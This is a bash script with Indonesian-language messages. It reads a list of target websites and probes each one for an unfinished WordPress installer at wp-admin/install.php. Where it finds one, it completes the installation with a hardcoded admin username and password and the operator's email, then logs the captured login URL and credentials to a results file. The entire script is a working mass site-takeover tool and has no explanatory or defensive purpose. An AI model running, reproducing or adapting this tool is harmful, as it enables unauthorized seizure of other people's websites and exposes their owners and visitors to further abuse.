#!/bin/bash
biru='\033[34;1m'
ungu='\033[35;1m'
sian='\033[0;36m'
hijau='\e[92m'
merah='\033[0;31m'

gas() {
    if [[ $(curl -s -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/44.0.2403.89 Safari/537.36" $site/wp-admin/install.php | grep -o 'English (United States)') =~ 'English (United States)' ]]; then
        echo "[+] Sepertinya vuln"
        exploit=$(curl --silent -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/44.0.2403.89 Safari/537.36" -d "weblog_title=${site}&user_name=admin&admin_password=Sandani23#&admin_password2=Sandani23#&admin_email=$email" "$site/wp-admin/install.php?step=2" | grep -o '<h1>Success!</h1>')
        if [[ $exploit =~ '<h1>Success!</h1>' ]]; then
            printf "$hijau[+] Succesfully installed!\n"
            echo "$site/wp-login.php#admin@Sandani23#" | tee -a hasil_ins.txt
            echo "Username = admin" | tee -a hasil_ins.txt
            echo "Password = Sandani23#" | tee -a hasil_ins.txt
        else
            printf "$merah[-] Installation failed :(\n"
        fi
    else
        printf "$merah[-] Not vulnerable!\n"
    fi
}

read -p "Input list of targets: " list
read -p "Your email: " email

for site in $(cat $list); do
    printf "$sian[Trying] $site\n"
    gas $site $email
done
